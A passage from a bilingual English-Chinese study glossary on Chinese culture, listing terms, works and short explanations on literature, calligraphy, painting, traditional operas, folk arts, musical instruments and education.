</blockquote>
<ul>
<li>
<p>the story of the rebellion of the 108 heroes at the end of the Northern Song dynasty</p>
<blockquote>
<p>北宋末年，108位英雄起义的故事</p>
</blockquote>
</li>
<li>
<p>peasant revolts / peasant uprising</p>
<blockquote>
<p>农民起义</p>
</blockquote>
</li>
<li>
<p>execute justice in the name of Heaven by killing the rich and relieving the poor</p>
<blockquote>
<p>杀富济贫，替天行道</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Journey to the West</em></p>
<blockquote>
<p>《西游记》</p>
</blockquote>
<ul>
<li>
<p>the Tang-dynasty monk, Xuanzang, overcoming 81 adversities (苦难) and defeating various monsters and demons before finally reaching India, assisted by his three disciples: the Monkey King, the Eight-Commandment Pig, and Monk Sha.</p>
<blockquote>
<p>唐僧玄奘在他的三个弟子孙悟空、八戒猪和和尚沙的帮助下，克服了八十一难，打败了各种妖怪，最终到达了印度。</p>
</blockquote>
</li>
<li>
<p>The Monkey King Creates Havoc in Heaven</p>
<blockquote>
<p>《孙悟空大闹天宫》</p>
</blockquote>
</li>
<li>
<p>The Eight-Commandment Pig Gets Married at Gaolaozhuang Village</p>
<blockquote>
<p>《猪八戒高老庄娶亲》</p>
</blockquote>
</li>
<li>
<p>The Monkey King Thrice Defeats the Skeleton Demon</p>
<blockquote>
<p>《孙悟空三打白骨精》</p>
</blockquote>
</li>
<li>
<p>Crossing the Flaming Mountain</p>
<blockquote>
<p>《过火焰山》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>A Dream of the Red Mansions</em></p>
<blockquote>
<p>《红楼梦》</p>
</blockquote>
<ul>
<li>
<p><em>A Dream of the Red Mansions</em> by Cao Xueqin reached the pinnacle (顶峰) of classical Chinese novels. It has long been acknowledged as the greatest novel in Chinese literature.</p>
<blockquote>
<p>曹雪芹的《红楼梦》达到了中国古典小说的顶峰。它一直被认为是中国文学中最伟大的小说。</p>
</blockquote>
</li>
<li>
<p>the prosperity and decline of a large feudal family</p>
<blockquote>
<p>一个封建大家族的兴衰</p>
</blockquote>
</li>
<li>
<p>the tragic love story between Jia Baoyu and Lin Daiyu</p>
<blockquote>
<p>贾宝玉和林黛玉的悲剧爱情故事</p>
</blockquote>
</li>
<li>
<p>The novel is really a panorama (全景画) of feudal society and has been considered an encyclopedia (百科全书) of Chinese literature.</p>
<blockquote>
<p>这部小说确实是封建社会的全景画，被认为是中国文学的百科全书。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Strange Tales from a Scholar’s Studio</em></p>
<blockquote>
<p>《聊斋志异》</p>
</blockquote>
</li>
<li>
<p><em>The Scholars</em></p>
<blockquote>
<p>《儒林外史》</p>
</blockquote>
</li>
<li>
<p>worldly novels</p>
<blockquote>
<p>世情小说</p>
</blockquote>
</li>
<li>
<p>the Hundred Days Reform</p>
<blockquote>
<p>百日维新</p>
</blockquote>
</li>
</ul>
<h3 id="Modern-Literature"><a class="header-anchor" href="#Modern-Literature">¶</a>Modern Literature</h3>
<ul>
<li>
<p>the 4 May Movement</p>
<blockquote>
<p>五四运动</p>
</blockquote>
</li>
<li>
<p>Anti-Japanese War period</p>
<blockquote>
<p>抗日战争时期</p>
</blockquote>
</li>
<li>
<p>the War of Liberation</p>
<blockquote>
<p>解放战争</p>
</blockquote>
</li>
</ul>
<h4 id="Lu-Xun"><a class="header-anchor" href="#Lu-Xun">¶</a>Lu Xun</h4>
<ul>
<li>
<p>Fierce-browed, I coolly defy a thousand pointing fingers. Head-bowed, like a willing ox I serve the children.</p>
<blockquote>
<p>横眉冷对千夫指，俯首甘为孺子牛</p>
</blockquote>
</li>
<li>
<p><em>A Madman’s Diary</em></p>
<blockquote>
<p>《狂人日记》</p>
</blockquote>
</li>
<li>
<p><em>Outcry</em></p>
<blockquote>
<p>《呐喊》</p>
</blockquote>
</li>
<li>
<p><em>The True Story of Ah Q</em></p>
<blockquote>
<p>《阿Q正传》</p>
</blockquote>
</li>
<li>
<p><em>Wandering</em></p>
<blockquote>
<p>《彷徨》</p>
</blockquote>
</li>
<li>
<p><em>Old Tales Retold</em></p>
<blockquote>
<p>《故事新编》</p>
</blockquote>
</li>
<li>
<p><em>Wild Grass</em></p>
<blockquote>
<p>《野草》</p>
</blockquote>
</li>
</ul>
<h4 id="Ba-Jin"><a class="header-anchor" href="#Ba-Jin">¶</a>Ba Jin</h4>
<ul>
<li>
<p>Trilogy of the Turbulent Currents</p>
<blockquote>
<p>激流三部曲</p>
</blockquote>
</li>
<li>
<p><em>Famili, Spring and Autumn</em></p>
<blockquote>
<p>《家》《春》《秋》</p>
</blockquote>
</li>
<li>
<p><em>The Border Town</em></p>
<blockquote>
<p>《边城》</p>
</blockquote>
</li>
</ul>
<h3 id="Contemporary-Literature"><a class="header-anchor" href="#Contemporary-Literature">¶</a>Contemporary Literature</h3>
<ul>
<li>
<p><em>The Song of Youth</em></p>
<blockquote>
<p>《青春之歌》</p>
</blockquote>
</li>
<li>
<p><em>Tracks in the Snowy Forest</em></p>
<blockquote>
<p>《林海雪原》</p>
</blockquote>
</li>
<li>
<p><em>The Red Sun</em></p>
<blockquote>
<p>《红日》</p>
</blockquote>
</li>
<li>
<p><em>Red Crag</em></p>
<blockquote>
<p>《红岩》</p>
</blockquote>
</li>
<li>
<p>misty poets</p>
<blockquote>
<p>朦胧诗人</p>
</blockquote>
</li>
</ul>
<h4 id="Yu-Hua"><a class="header-anchor" href="#Yu-Hua">¶</a>Yu Hua</h4>
<ul>
<li>
<p><em>Chronicle of a Blood Merchant</em></p>
<blockquote>
<p>《许三观卖血记》</p>
</blockquote>
</li>
<li>
<p><em>To Live</em></p>
<blockquote>
<p>《活着》</p>
</blockquote>
</li>
</ul>
<h4 id="Winner-of-the-Nobel-Prize-for-Literature-2012–Mo-Yan"><a class="header-anchor" href="#Winner-of-the-Nobel-Prize-for-Literature-2012–Mo-Yan">¶</a>Winner of the Nobel Prize for Literature 2012–Mo Yan</h4>
<ul>
<li>
<p><em>Red Sorghum</em></p>
<blockquote>
<p>《红高粱》</p>
</blockquote>
</li>
<li>
<p><em>Big Breasts and Wide Hips</em></p>
<blockquote>
<p>《丰乳肥臀》</p>
</blockquote>
</li>
<li>
<p><em>Life and Death are Wearing Me Out</em></p>
<blockquote>
<p>《生死疲劳》</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-3Arts"><a class="header-anchor" href="#CHAPTER-3Arts">¶</a>CHAPTER 3	Arts</h2>
<h3 id="Calligraphy-and-Painting"><a class="header-anchor" href="#Calligraphy-and-Painting">¶</a>Calligraphy and Painting</h3>
<h4 id="Calligraphy"><a class="header-anchor" href="#Calligraphy">¶</a>Calligraphy</h4>
<ul>
<li>
<p>Chinese art of calligraphy</p>
<blockquote>
<p>中国书法艺术</p>
</blockquote>
</li>
<li>
<p>brush</p>
<blockquote>
<p>毛笔</p>
</blockquote>
</li>
<li>
<p>overall layout</p>
<blockquote>
<p>整体结构</p>
</blockquote>
</li>
<li>
<p>“The handwriting reveals the writer.”</p>
<blockquote>
<p>字如其人</p>
</blockquote>
</li>
<li>
<p>It was believed that the force used in writing betrayed (表露) one’s disposition (性情) and that the written characters revealed the calligrapher’s understanding of life and arts.</p>
<blockquote>
<p>人们认为，写字的力度表露出一个人的性情，所写的文字揭示了书法家对生活和艺术的理解。</p>
</blockquote>
</li>
<li>
<p>Practicing calligraphy could help a person to achieve relaxation and repel outside disturbances.</p>
<blockquote>
<p>练习书法可以帮助一个人达到放松和排斥外界的干扰。</p>
</blockquote>
</li>
</ul>
<h4 id="Five-Styles-of-Chinese-Scripts"><a class="header-anchor" href="#Five-Styles-of-Chinese-Scripts">¶</a>Five Styles of Chinese Scripts</h4>
<ul>
<li>
<p>the seal script</p>
<blockquote>
<p>篆书</p>
</blockquote>
</li>
<li>
<p>the official script</p>
<blockquote>
<p>隶书</p>
</blockquote>
</li>
<li>
<p>the cursive script</p>
<blockquote>
<p>草书</p>
</blockquote>
</li>
<li>
<p>the regular script</p>
<blockquote>
<p>楷书</p>
</blockquote>
</li>
<li>
<p>the running script</p>
<blockquote>
<p>行书</p>
</blockquote>
</li>
<li>
<p>unify the writing system</p>
<blockquote>
<p>统一文字</p>
</blockquote>
</li>
<li>
<p>lesser seal script</p>
<blockquote>
<p>小篆</p>
</blockquote>
</li>
<li>
<p>abstract beauty</p>
<blockquote>
<p>抽象美</p>
</blockquote>
</li>
<li>
<p>come to prominence</p>
<blockquote>
<p>出名</p>
</blockquote>
</li>
<li>
<p>big/small/medium regular script</p>
<blockquote>
<p>大楷 / 小楷 / 中楷</p>
</blockquote>
</li>
<li>
<p>running regular script</p>
<blockquote>
<p>行楷</p>
</blockquote>
</li>
<li>
<p>running cursive script</p>
<blockquote>
<p>行草</p>
</blockquote>
</li>
<li>
<p>Wang Xizhi —— “Sage of Chinese Calligraphy”</p>
<blockquote>
<p>王羲之——“书圣”</p>
</blockquote>
</li>
<li>
<p><em>The Preface to the Lanting Collection of Calligraphy</em></p>
<blockquote>
<p>《兰亭集序》</p>
</blockquote>
</li>
</ul>
<h4 id="Four-Great-Regular-Script-Masters"><a class="header-anchor" href="#Four-Great-Regular-Script-Masters">¶</a>Four Great Regular Script Masters</h4>
<blockquote>
<p>楷书四大家</p>
</blockquote>
<ul>
<li>
<p>Ouyang Xun, Yan Zhenqing, Liu Gongquan, Zhao Mengfu</p>
<blockquote>
<p>欧阳询、颜真卿、柳公权、赵孟頫</p>
</blockquote>
</li>
<li>
<p>Yan’s tendon and Liu’s bone</p>
<blockquote>
<p>“颜筋柳骨”</p>
</blockquote>
</li>
</ul>
<h3 id="Painting"><a class="header-anchor" href="#Painting">¶</a>Painting</h3>
<ul>
<li>
<p>Painting is said to have the same origin as calligraphy.</p>
<blockquote>
<p>书画同源</p>
</blockquote>
</li>
<li>
<p>ink-wash painting</p>
<blockquote>
<p>水墨画</p>
</blockquote>
</li>
<li>
<p>Traditional Chinese paintings are not purely paintings, They combine fine art, poetry, calligraphy, and seal engraving to achieve an artistic unison (一致) .</p>
<blockquote>
<p>中国画不是单纯的绘画，它结合了美术、诗词、书法和篆刻，达到了艺术的一致</p>
</blockquote>
</li>
<li>
<p>figure painting</p>
<blockquote>
<p>人物画</p>
</blockquote>
</li>
<li>
<p>Wu Daozi —— Sage of Chinese Painting</p>
<blockquote>
<p>吴道子——画圣</p>
</blockquote>
</li>
<li>
<p>Zhang Zeduan —— <em>Along the River During the Qingming Festival</em></p>
<blockquote>
<p>张择端——《清明上河图》</p>
</blockquote>
</li>
<li>
<p>Xu Beihong —— <em>Galloping Horse</em> and <em>The Foolish Man Moving Mountains</em></p>
<blockquote>
<p>徐悲鸿——《奔马图》《愚公移山》</p>
</blockquote>
</li>
<li>
<p>“The excellence of a painting lies in its being alike, yet unlike. Too much likeness flatters the vulgar (俗气的) taste; too much unlikeness deceives the world.”</p>
<blockquote>
<p>画妙在似与不似之间，太似则媚俗，不似则欺世</p>
</blockquote>
</li>
</ul>
<h3 id="Four-Treasures-of-the-Study"><a class="header-anchor" href="#Four-Treasures-of-the-Study">¶</a>Four Treasures of the Study</h3>
<blockquote>
<p>文房四宝</p>
</blockquote>
<ul>
<li>
<p>brush, ink, paper and ink slab</p>
<blockquote>
<p>笔墨纸砚</p>
</blockquote>
</li>
<li>
<p><em>Hu</em> brush, <em>Hui</em> ink stick, <em>Xuan</em> paper and <em>Duan</em> ink slab</p>
<blockquote>
<p>湖笔、徽墨、宣纸、端砚</p>
</blockquote>
</li>
</ul>
<h3 id="Traditional-Operas"><a class="header-anchor" href="#Traditional-Operas">¶</a>Traditional Operas</h3>
<ul>
<li>
<p>Chinese opera is considered one of the three ancient forms of drama in the world, with the other two being Greek tragedy and comedy, and Indian Sanskrit opera.</p>
<blockquote>
<p>中国戏曲被认为是世界三大古代戏剧之一，另外两个是希腊悲剧和喜剧，以及印度梵语歌剧。</p>
</blockquote>
</li>
</ul>
<h4 id="Beijing-Opera"><a class="header-anchor" href="#Beijing-Opera">¶</a>Beijing Opera</h4>
<ul>
<li>
<p>Kunqu Opera</p>
<blockquote>
<p>昆曲</p>
</blockquote>
</li>
<li>
<p>Shaanxi Opera</p>
<blockquote>
<p>秦腔</p>
</blockquote>
</li>
<li>
<p>Singing, recitation, acting, and acrobatic fighting</p>
<blockquote>
<p>唱、念、做、打</p>
</blockquote>
</li>
</ul>
<h5 id="Sheng-Dan-Jing-and-Chou"><a class="header-anchor" href="#Sheng-Dan-Jing-and-Chou">¶</a>Sheng, Dan, Jing and Chou</h5>
<blockquote>
<p>生、旦、净、丑</p>
</blockquote>
<ul>
<li>
<p><em>sheng</em> (male)</p>
<ul>
<li>
<p><em>laosheng / xusheng</em> (elderly men)    decisive and honest</p>
<blockquote>
<p>老生 / 须生    果断、诚实</p>
</blockquote>
</li>
<li>
<p><em>wusheng</em> (military men)     young generals skilled in martial arts</p>
<blockquote>
<p>武生   精通武术的年轻将领</p>
</blockquote>
</li>
<li>
<p><em>wawasheng</em> (children)</p>
<blockquote>
<p>娃娃生</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>dan</em> (female)</p>
<ul>
<li>
<p>*laodan *    elderly women</p>
<blockquote>
<p>老旦</p>
</blockquote>
</li>
<li>
<p><em>qingyi</em>     young or middle-aged women of strong character and refined disposition</p>
<blockquote>
<p>青衣    性格刚强、气质高雅的年轻或中年女性</p>
</blockquote>
</li>
<li>
<p><em>huadan</em>     agile young women with a frank and open personality</p>
<blockquote>
<p>花旦    灵活的年轻女性，性格坦率、开放</p>
</blockquote>
</li>
<li>
<p><em>wudan</em>     women skilled in martial arts, including generals, heroic forest outlaws (绿林“好汉”) and fairies</p>
<blockquote>
<p>武旦    精通武术的女性，包括将军、英勇的绿林“好汉”和仙女</p>
</blockquote>
</li>
<li>
<p>*caidan *   clowns in farces (滑稽戏) and comedies</p>
<blockquote>
<p>彩旦    滑稽戏和喜剧中的小丑</p>
</blockquote>
</li>
<li>
<p>“Four Great <em>Dan</em> Actor” —— Mei Lanfang, Shang Xiaoyun, Cheng Yanqiu, and Xun Huisheng</p>
<blockquote>
<p>“四大旦”——梅兰芳、尚小云、程砚秋、荀慧生</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>jing</em> (male with a painting face)</p>
<ul>
<li>
<p><em>Jing</em> wear colourful paint on their faces, so they are also known as <em>hualian</em> (花脸)</p>
<blockquote>
<p>他们的脸上涂着五颜六色的颜料，所以他们也被称为花脸。</p>
</blockquote>
</li>
<li>
<p><em>zhengjing / dahualian</em>      primary face-painted role</p>
<blockquote>
<p>正净</p>
</blockquote>
</li>
<li>
<p><em>fujing</em>    secondary face-painted role</p>
<blockquote>
<p>副净</p>
</blockquote>
</li>
<li>
<p><em>wujing</em>    military face-painted role</p>
<blockquote>
<p>武净</p>
</blockquote>
</li>
<li>
<p>Most <em>Zhengjing</em> are serious, loyal officials and generals who firmly uphold justice.</p>
<blockquote>
<p>大多数“正净”都是严肃、忠诚的官员和将军，他们坚决维护正义。</p>
</blockquote>
</li>
<li>
<p><em>Fujing</em> performers mainly move about, speaking and making postures.</p>
<blockquote>
<p>副净主要是走动，说话和摆姿势。</p>
</blockquote>
</li>
<li>
<p><em>Wujing</em> roles involve acrobatic fighting and tumbling with minimal singing and speaking.</p>
<blockquote>
<p>武净包括杂技式的打斗和翻滚，很少唱歌和说话。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>chou</em> (clown)</p>
<ul>
<li>
<p><em>Chou</em> are sharp-witted, clever, humorous, honest, and kind men.</p>
<blockquote>
<p>丑是机智、聪明、幽默、诚实、善良的男性。</p>
</blockquote>
</li>
<li>
<p><em>wenchou</em>    <em>comic civilian role</em> who speak, act, and sing</p>
<blockquote>
<p>文丑    喜剧中的平民角色，能说、能演、能唱</p>
</blockquote>
</li>
<li>
<p><em>wuchou</em>  <em>acrobatic-fighting comic role</em> whose performance involves both speaking and acrobatic fighting.</p>
<blockquote>
<p>武丑    喜剧中的武打杂耍角色，表演内容包括说话和武打。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Sheng, dan, jing</em> and <em>chou</em> represent people from all walks of life.</p>
<blockquote>
<p>“生”、“旦”、“净”、“丑”代表着各行各业的人。</p>
</blockquote>
</li>
</ul>
<h5 id="Facial-Make-Up-and-Costume-in-Beijing-Opera"><a class="header-anchor" href="#Facial-Make-Up-and-Costume-in-Beijing-Opera">¶</a>Facial Make-Up and Costume in Beijing Opera</h5>
<blockquote>
<p>京剧中的脸谱和服装</p>
</blockquote>
<h6 id="Color"><a class="header-anchor" href="#Color">¶</a>Color</h6>
<ul>
<li>
<p><strong>Red</strong> is used for loyal and upright characters; <strong>purple</strong> for loyal, brave, just, and noble characters; <strong>green</strong> for stubborn, irritable, and not easily controlled characters; <strong>yellow</strong> for fierce, brutal, and calculating characters; <strong>white</strong> for imperious and treacherous people; <strong>gold-silvered</strong> make-up for ghosts and gods. <strong>White</strong> make-up between eyes and nose is specially used for a clown.</p>
<blockquote>
<p>红色代表忠诚正直的人物; 紫色代表忠诚、勇敢、公正和高尚的品格; 绿色代表顽固、易怒、不易控制的人物; 黄色代表凶猛、残忍和精于算计的角色; 白色代表专横和奸诈的人; 金银色为鬼神妆扮。眼睛和鼻子之间的白色妆扮是专门用来扮小丑的</p>
</blockquote>
</li>
</ul>
<h4 id="Kunqu-Opera"><a class="header-anchor" href="#Kunqu-Opera">¶</a>Kunqu Opera</h4>
<blockquote>
<p>昆曲</p>
</blockquote>
<ul>
<li>
<p><em>Kunqu</em> Opera is considered the mother of many other types of traditional opera.</p>
<blockquote>
<p>昆曲被认为是许多其他传统戏曲的鼻祖。</p>
</blockquote>
</li>
<li>
<p><em>Kunqu</em> Opera is known for its gentle and clear vocals, beautiful and refined tunes, and dance-like stage performances.</p>
<blockquote>
<p>昆曲以其柔和清晰的嗓音、优美精致的曲调和舞蹈般的舞台表演而闻名。</p>
</blockquote>
</li>
<li>
<p>Oral and Intangible Cultural Heritage</p>
<blockquote>
<p>人类口头非物质文化遗产</p>
</blockquote>
</li>
<li>
<p><em>The Peony Pavilion</em></p>
<blockquote>
<p>《牡丹亭》</p>
</blockquote>
</li>
<li>
<p><em>The Palace of Eternal Life</em></p>
<blockquote>
<p>《长恨歌》</p>
</blockquote>
</li>
</ul>
<h4 id="Henan-Opera"><a class="header-anchor" href="#Henan-Opera">¶</a>Henan Opera</h4>
<blockquote>
<p>豫剧</p>
</blockquote>
<ul>
<li>
<p>With Henan province as its origin, Henan Opera is popular mostly in the areas of the Yellow River and Huai River.</p>
<blockquote>
<p>豫剧起源于河南省，主要流行于黄河和淮河流域。</p>
</blockquote>
</li>
<li>
<p><em>Kao Hong</em></p>
<blockquote>
<p>《拷红》</p>
</blockquote>
</li>
<li>
<p><em>White Snake Story</em></p>
<blockquote>
<p>《白蛇传》</p>
</blockquote>
</li>
<li>
<p><em>Mu Guiying Assumes Command</em></p>
<blockquote>
<p>《穆桂英挂帅》</p>
</blockquote>
</li>
</ul>
<h4 id="Sichuan-Opera"><a class="header-anchor" href="#Sichuan-Opera">¶</a>Sichuan Opera</h4>
<blockquote>
<p>川剧</p>
</blockquote>
<ul>
<li>
<p>face changes</p>
<blockquote>
<p>变脸</p>
</blockquote>
</li>
</ul>
<h4 id="Shaoxing-Opera"><a class="header-anchor" href="#Shaoxing-Opera">¶</a>Shaoxing Opera</h4>
<blockquote>
<p>越剧</p>
</blockquote>
<ul>
<li>
<p>The soft and gentle music of this opera evokes sentimental emotions, and the acting style is likewise graceful and refined.</p>
</li>
<li>
<p><em>The Butterfly Lovers</em></p>
<blockquote>
<p>《梁山伯与祝英台》</p>
</blockquote>
</li>
<li>
<p><em>A Dream of the Red Mansions</em></p>
<blockquote>
<p>《红楼梦》</p>
</blockquote>
</li>
<li>
<p><em>Romance of the West Chamber</em></p>
<blockquote>
<p>《西厢记》</p>
</blockquote>
</li>
<li>
<p><em>Chasing the Fish</em></p>
<blockquote>
<p>《追鱼》</p>
</blockquote>
</li>
</ul>
<h4 id="Huangmei-Opera"><a class="header-anchor" href="#Huangmei-Opera">¶</a>Huangmei Opera</h4>
<blockquote>
<p>黄梅戏</p>
</blockquote>
<ul>
<li>
<p><em>Huangmei</em> Opera is easy to understand and learn because it uses simple words and literary traditions.</p>
<blockquote>
<p>黄梅戏很容易理解和学习，因为它使用简单的文字和文学传统。</p>
</blockquote>
</li>
<li>
<p><em>Huangmei</em> actress Yan Fengying</p>
<blockquote>
<p>黄梅戏演员严凤英</p>
</blockquote>
</li>
<li>
<p><em>The Heavenly Maid and the Mortal</em></p>
<blockquote>
<p>《天仙配》</p>
</blockquote>
</li>
<li>
<p><em>Female Son-in-Law of the Emperor</em></p>
<blockquote>
<p>《女驸马》</p>
</blockquote>
</li>
</ul>
<h3 id="Folk-Performing-Arts"><a class="header-anchor" href="#Folk-Performing-Arts">¶</a>Folk Performing Arts</h3>
<ul>
<li>
<p>China has a wide variety of folk performing arts featuring, among others, acrobatics, <em>quyi</em> (曲艺), puppet plays (木偶戏), shadow plays (皮影戏), etc.</p>
<blockquote>
<p>中国的民间表演艺术种类繁多，其中包括杂技、曲艺、木偶戏、皮影戏等。</p>
</blockquote>
</li>
</ul>
<h4 id="Quyi"><a class="header-anchor" href="#Quyi">¶</a>Quyi</h4>
<ul>
<li>
<p>crosswalk</p>
<blockquote>
<p>相声</p>
</blockquote>
</li>
<li>
<p>clapper talk</p>
<blockquote>
<p>快板</p>
</blockquote>
</li>
<li>
<p><em>pingshu</em></p>
<blockquote>
<p>评书</p>
</blockquote>
</li>
<li>
<p>short play</p>
<blockquote>
<p>小品</p>
</blockquote>
</li>
</ul>
<h5 id="crosswalk"><a class="header-anchor" href="#crosswalk">¶</a>crosswalk</h5>
<ul>
<li>
<p>talking, imitation, fun-making, and sing</p>
<blockquote>
<p>说、学、逗、唱</p>
</blockquote>
</li>
<li>
<p>comic monologue</p>
<blockquote>
<p>单口相声</p>
</blockquote>
</li>
<li>
<p>comic dialogue</p>
<blockquote>
<p>对口相声</p>
</blockquote>
</li>
<li>
<p>group crosstalk</p>
<blockquote>
<p>群口相声</p>
</blockquote>
</li>
</ul>
<h5 id="Clapper-Talk"><a class="header-anchor" href="#Clapper-Talk">¶</a>Clapper Talk</h5>
<ul>
<li>
<p>bamboo clappers</p>
<blockquote>
<p>竹拍板</p>
</blockquote>
</li>
</ul>
<h5 id="Pingshu"><a class="header-anchor" href="#Pingshu">¶</a>Pingshu</h5>
<ul>
<li>
<p><em>Pingshu</em> is a kind of storytelling, with <em>pingshu</em> performers adding their own commentaries to subjects and characters.</p>
<blockquote>
<p>评书是一种讲故事的方式，评书表演者评论主题和角色。</p>
</blockquote>
</li>
<li>
<p>gavel</p>
<blockquote>
<p>醒木</p>
</blockquote>
</li>
<li>
<p>folded fan</p>
<blockquote>
<p>折扇</p>
</blockquote>
</li>
</ul>
<h4 id="Puppet-Play"><a class="header-anchor" href="#Puppet-Play">¶</a>Puppet Play</h4>
<ul>
<li>
<p>In puppet plays, actors or specially-trained operators manipulate the puppets with their hands and fingers by means of sticks and strings.</p>
<blockquote>
<p>在木偶剧中，演员或受过特殊训练的操作者用手和手指通过棍子和绳子操纵木偶。</p>
</blockquote>
</li>
</ul>
<h3 id="Traditional-Music-Instruments"><a class="header-anchor" href="#Traditional-Music-Instruments">¶</a>Traditional Music Instruments</h3>
<blockquote>
<p>传统乐器</p>
</blockquote>
<h4 id="Plucked-Instruments"><a class="header-anchor" href="#Plucked-Instruments">¶</a>Plucked Instruments</h4>
<blockquote>
<p>弦乐器</p>
</blockquote>
<ul>
<li>
<p><em>Pipa</em></p>
<blockquote>
<p>琵琶</p>
</blockquote>
<ul>
<li>
<p><em>Ambush on All Sides</em></p>
<blockquote>
<p>十面埋伏</p>
</blockquote>
</li>
<li>
<p><em>Spring Moonlight on the Flowers by the River</em></p>
<blockquote>
<p>《春江花月夜》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Guzheng</em></p>
<blockquote>
<p>古筝</p>
</blockquote>
<ul>
<li>
<p><em>Singing on the Return of Fishing Boats</em></p>
<blockquote>
<p>《渔舟唱晚》</p>
</blockquote>
</li>
<li>
<p><em>High Mount Flowing Water</em></p>
<blockquote>
<p>《高山流水》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Erhu</em></p>
<blockquote>
<p>二胡</p>
</blockquote>
<ul>
<li>
<p><em>Two Springs Reflect the Moon</em></p>
<blockquote>
<p>《二泉映月》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><em>Sanxian</em></p>
<blockquote>
<p>三弦</p>
</blockquote>
<ul>
<li>
<p>used as an accompanying instrument in <em>Kunqu</em> Opera</p>
<blockquote>
<p>在昆曲中用作伴奏乐器</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="Percussion-Instruments"><a class="header-anchor" href="#Percussion-Instruments">¶</a>Percussion Instruments</h4>
<blockquote>
<p>打击乐器</p>
</blockquote>
<ul>
<li>
<p>Drum</p>
<blockquote>
<p>鼓</p>
</blockquote>
</li>
<li>
<p>Gong</p>
<blockquote>
<p>锣</p>
</blockquote>
</li>
</ul>
<h4 id="Wind-Instruments"><a class="header-anchor" href="#Wind-Instruments">¶</a>Wind Instruments</h4>
<blockquote>
<p>管乐器</p>
</blockquote>
<ul>
<li>
<p>the ceremonial horn</p>
<blockquote>
<p>唢呐</p>
</blockquote>
<ul>
<li>
<p><em>One Hundred Birds Serenade the Phoenix</em></p>
<blockquote>
<p>《百鸟朝凤》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>the bamboo flute</p>
<blockquote>
<p>笛子</p>
</blockquote>
</li>
<li>
<p>the vertical bamboo flute / <em>xiao</em></p>
<blockquote>
<p>箫</p>
</blockquote>
</li>
</ul>
<h1>Part 2 Education, Science &amp; Technology, and Sports</h1>
<ul>
<li>
<p>China is a country which always attaches much importance to education and its education can meet the needs of Chinese people, regardless of their age, background, or choice of subjects.</p>
<blockquote>
<p>中国是一个非常重视教育的国家，中国的教育可以满足中国人的需求，无论他们的年龄，背景或选择的科目。</p>
</blockquote>
</li>
<li>
<p>With the development of Chinese education, China has made great achievements in science and technology. Besides, China has made great efforts to develop its sports so that Chinese people can enjoy physical fitness. Now traditional non-competitive sports exist side by side with modern Olympic sports in China.</p>
<blockquote>
<p>随着中国教育的发展，中国在科学技术方面取得了巨大成就。此外，中国在发展体育运动方面做出了巨大的努力，使中国人能够享受身体健康。在中国，传统非竞技体育与现代奥林匹克体育并存。</p>
</blockquote>
</li>
</ul>
<h2 id="CHAPTER-4Education"><a class="header-anchor" href="#CHAPTER-4Education">¶</a>CHAPTER 4	Education</h2>
<h3 id="Development-of-Traditional-Education"><a class="header-anchor" href="#Development-of-Traditional-Education">¶</a>Development of Traditional Education</h3>
<ul>
<li>
<p>Since ancient times, the traditions of teaching and education in China have been held in the highest esteem (尊敬).</p>
<blockquote>
<p>自古以来，中国的教学和教育传统一直受到最高的尊敬。</p>
</blockquote>
</li>
<li>
<p>private school</p>
<blockquote>
<p>私塾</p>
</blockquote>
</li>
<li>
<p>official institution</p>
<blockquote>
<p>官学</p>
</blockquote>
</li>
</ul>
<h4 id="Private-Schools"><a class="header-anchor" href="#Private-Schools">¶</a>Private Schools</h4>
<ul>
<li>
<p>Confucius devoted all his life to the private school system and instructed many students.</p>
<blockquote>
<p>孔子一生致力于私学，教导了许多学生。</p>
</blockquote>
</li>
</ul>
<h4 id="Official-Schools"><a class="header-anchor" href="#Official-Schools">¶</a>Official Schools</h4>
<ul>
<li>
<p>Four Books and Five Classics</p>
<blockquote>
<p>四书五经</p>
</blockquote>
<ul>
<li>
<p>Four Books</p>
<ul>
<li>
<p><em>The Great Learning</em></p>
<blockquote>
<p>《大学》</p>
</blockquote>
</li>
<li>
<p><em>The Doctrine of the Mean</em></p>
<blockquote>
<p>《中庸》</p>
</blockquote>
</li>
<li>
<p><em>The Analects of Confucius</em></p>
<blockquote>
<p>《论语》</p>
</blockquote>
</li>
<li>
<p><em>Mencius</em></p>
<blockquote>
<p>《孟子》</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Five Classics</p>
<ul>
<li>
<p><em>The Book of Songs</em></p>
<blockquote>
<p>《诗经》</p>
</blockquote>
</li>
<li>
<p><em>The Book of History</em></p>
<blockquote>
<p>《尚书》</p>
</blockquote>
</li>
<li>
<p><em>The Book of Rites</em></p>
<blockquote>
<p>《礼记》</p>
</blockquote>
</li>
<li>
<p><em>The Book of Changes</em></p>
<blockquote>
<p>《易经》</p>
</blockquote>
</li>
<li>
<p><em>The Spring and Autumn Annals</em></p>
<blockquote>
<p>《春秋》</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Imperial-Civil-Examination-System"><a class="header-anchor" href="#Imperial-Civil-Examination-System">¶</a>Imperial Civil Examination System</h4>
<ul>
<li>
<p><em>keju</em></p>
<blockquote>
<p>科举</p>
</blockquote>
</li>
<li>
<p><em>jinshi</em>     successful candidates in the highest imperial civil examinations</p>
<blockquote>
<p>进士    科举考试的优秀者</p>
</blockquote>
</li>
<li>
<p><em>zhuangyuan</em>   <em>bangyan</em>  <em>tanhua</em></p>
<blockquote>
<p>殿试前三名：状元、榜眼、探花</p>
</blockquote>
</li>
<li>
<p>Opium War</p>
<blockquote>
<p>鸦片战争</p>
</blockquote>
</li>
</ul>
<h3 id="Present-Education"><a class="header-anchor" href="#Present-Education">¶</a>Present Education</h3>
<blockquote>
<p>现代教育</p>
</blockquote>
<ul>
<li>
<p>Basic education encompasses pre-school education, primary school education and middle school education (junior middle and senior middle).</p>
<blockquote>
<p>基础教育包括学前教育、小学教育和中学教育(初中和高中)。</p>
</blockquote>
</li>
